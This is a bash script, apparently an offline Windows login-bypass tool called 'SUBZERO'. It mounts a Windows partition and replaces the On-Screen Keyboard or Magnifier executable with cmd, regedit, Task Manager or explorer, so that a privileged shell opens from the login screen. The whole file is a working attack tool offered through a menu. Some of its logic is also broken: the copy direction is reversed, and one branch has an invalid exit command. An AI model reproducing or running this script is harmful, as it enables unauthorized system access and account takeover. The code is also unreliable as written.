#!/bin/bash

MYDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null && pwd )"
MKPATCH=1

usage()
{
    echo "$0 <path to where windows is mounted>"
    echo "if no mountpoint is provided, script will try to parse mountpoint as /dev/sda4"
}

patchlist() {
    clear
    echo "Patch for $1.exe "
    echo "Patch with : "
    echo " 1 : cmd "
    echo " 2 : Netplwiz"
    echo " 3 : Control Panel (probably doesn't work)"
    echo " 4 : explorer.exe "
    echo " 5 : Calculator (calc)"
    echo " 6 : Display Switch (DisplaySwitch)"
    echo " 7 : Device Info (msinfo32)"
    echo " 8 : notepad "
    echo " 9 : Regedit (regedt32) "
    echo " 10 : Task Manager (taskmgr)"
    read -p " Make your choice : " patch 
        if [[ $patch = 1 ]]; then 
            patcher $1 cmd 
        elif [[ $patch = 2 ]]; then 
            patcher $1 Netplwiz 
        elif [[ $patch = 3 ]]; then 
            patcher $1 control 
        elif [[ $patch = 4 ]]; then 
            patcher $1 ../explorer 
        elif [[ $patch = 5 ]]; then 
            patcher $1 calc 
        elif [[ $patch = 6 ]]; then 
            patcher $1 DisplaySwitch 
        elif [[ $patch = 7 ]]; then 
            patcher $1 msinfo32 
        elif [[ $patch = 8 ]]; then 
            patcher $1 notepad 
        elif [[ $patch = 9 ]]; then 
            patcher $1 regedt32 
        elif [[ $patch = 10 ]]; then 
            patcher $1 taskmgr 
        else 
            echo "Unknown option."
            exit 
        fi        
}

patcher() {
    echo Patching..
    cd drive/Windows/System32
    cp -fpr $2.exe $2.exe.bak 
    cp -fpr $1.exe $2.exe 
    echo "Patch done !"
}

if [[ $(whoami | grep root) ]]; then 
    : 
else 
    echo "Are we root? "
    exiting. 
fi 

if [[ $1 = "-h" ]]; then 
    usage 
    exit 
fi 

if [[ ! -n $1 ]]; then 
    MOUNTP=/dev/sda4
fi 
mkdir drive
sudo mount $MOUNTP drive   
if [[ $(ls drive/Windows/System32 | grep cmd.exe) ]]; then 
    :
else
    echo "System32 not found. Are you at the right directory?"
    exit 
fi 
echo "============================================================================="
echo " ______     __  __     ______     ______     ______     ______     ______    "  
echo "/\  ___\   /\ \/\ \   /\  == \   /\___  \   /\  ___\   /\  == \   /\  __ \   "  
echo "\ \___  \  \ \ \_\ \  \ \  __<   \/_/  /__  \ \  __\   \ \  __<   \ \ \/\ \  "
echo " \/\_____\  \ \_____\  \ \_____\   /\_____\  \ \_____\  \ \_\ \_\  \ \_____\ "
echo "  \/_____/   \/_____/   \/_____/   \/_____/   \/_____/   \/_/ /_/   \/_____/ "
echo "============================================================================="
echo "            Release R2 . What does it need to be human? @Elation232          "
echo "============================================================================="
echo ""
echo ""
echo ""
echo ""
echo "============================================================================="
echo "=                               Patch menu                                  ="
echo "= (1) Patch On Screen Keyboard (osk.exe)                                    ="
echo "= (2) Patch Magnifyer (magnify.exe)                                         ="
echo "= (3) View credits                                                          ="
echo "= (0) Reboot                                                                ="
echo "============================================================================="
read -p "Make your choice : " choice 

if [[ $choice = 1 ]]; then 
    patchlist osk 
elif [[ $choice = 2 ]]; then 
    patchlist Magnify 
elif [[ $choice = 3 ]]; then
    echo "jam boiiiiii"
elif [[ $choice = 0 ]]; then 
    reboot 
else 
    echo "unknown option bruh"
    exit 
fi
